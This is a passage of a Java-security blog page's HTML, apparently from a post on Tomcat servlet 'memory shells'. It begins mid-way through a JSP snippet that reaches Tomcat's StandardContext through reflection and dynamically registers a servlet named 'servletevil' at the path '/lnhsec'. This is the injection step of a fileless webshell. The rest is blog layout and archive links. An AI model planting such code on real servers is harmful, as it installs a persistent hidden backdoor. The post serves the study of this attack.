&#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">servletevil</span> <span class="variable">servlet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">servletevil</span>();</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"><span class="comment">//    ServletContext servletContext = request.getServletContext();</span></span><br><span class="line"><span class="comment">//    Field applicationContextField = servletContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="comment">//    applicationContextField.setAccessible(true);</span></span><br><span class="line"><span class="comment">//    ApplicationContext applicationContext = (ApplicationContext) applicationContextField.get(servletContext);</span></span><br><span class="line"><span class="comment">//    Field standardContextField = applicationContext.getClass().getDeclaredField(&quot;context&quot;);</span></span><br><span class="line"><span class="comment">//    standardContextField.setAccessible(true);</span></span><br><span class="line"><span class="comment">//    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更简单的方法 获取StandardContext</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">stdcontext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">newWrapper</span> <span class="operator">=</span> stdcontext.createWrapper();</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> servlet.getClass().getSimpleName();</span><br><span class="line">    newWrapper.setName(name);</span><br><span class="line">    newWrapper.setLoadOnStartup(<span class="number">1</span>);</span><br><span class="line">    newWrapper.setServlet(servlet);</span><br><span class="line">    newWrapper.setServletClass(servlet.getClass().getName());</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//映射</span></span><br><span class="line">    stdcontext.addChild(newWrapper);</span><br><span class="line">    stdcontext.addServletMappingDecoded(<span class="string">&quot;/lnhsec&quot;</span>, name);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC.assets/image-20220426214710140-0981070.png" alt="image-20220426214710140"></p>
+
+    </article>
+    <!-- license -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="http://w0s1np.github.io">w0s1np</a>
+            <p>Link：<a href="http://w0s1np.github.io/2022/04/26/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC/">http://w0s1np.github.io/2022/04/26/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC/</a>
+            <p>Publish date：<a href="http://w0s1np.github.io/2022/04/26/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC/">April 26th 2022, 9:49:22 pm</a>
+            <p>Update date：<a href="http://w0s1np.github.io/2022/04/26/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC/">April 26th 2022, 9:51:19 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/04/26/Tomcat-Listener-%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat Listener 内存马">
+                    <div class="prevTitle">Tomcat Listener 内存马</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:w0s1np.foxmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/w0s1np" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title=wechat>
+                    
+                    <img class="profile-qr" src="/assets/w0s1np.jpg" />
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.</span> <span class="toc-text">Tomcat Servlet 内存马</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-Servlet"><span class="toc-number">1.1.</span> <span class="toc-text">什么是 Servlet</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat-Servlet-%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">Tomcat Servlet 流程分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.3.</span> <span class="toc-text">内存马注入流程分析</span></a></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 6
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/26</span>
+            <a class="archive-post-title" href="/2022/04/26/Tomcat-Servlet-%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat Servlet 内存马</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/26</span>
+            <a class="archive-post-title" href="/2022/04/26/Tomcat-Listener-%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat Listener 内存马</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/25</span>
+            <a class="archive-post-title" href="/2022/04/25/Tomcat-Filter-%E5%86%85%E5%AD%98%E9%A9%AC/">Tomcat Filter 内存马</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span>
+            <a class="archive-post-title" href="/2022/03/31/Java-JNDI-Inject/">Java JNDI Inject</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span>
+            <a class="archive-post-title" href="/2022/03/31/java-RMI%D1%A7%CF%B0/">java RMI学习</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/31</span>
+            <a class="archive-post-title" href="/2022/03/31/hello-world/">Hello World</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="javasec">
+                <span class="iconfont-archer">&#xe606;</span>
+                javasec
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMetaRoot = "/"
+    if (siteMetaRoot === "undefined") {
+        siteMetaRoot = '/'
+    }
+    var siteMeta = {
+        url: "http://w0s1np.github.io",
+        root: siteMetaRoot,
+        author: "w0s1np"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20211217"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20211217"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
+        <!-- busuanzi -->
+        
+            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
+        
+        <!-- CNZZ -->
+        
+        <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20211217" async></script>
+        
+        <!-- mermaid -->
+        
+    </body>
+</html>
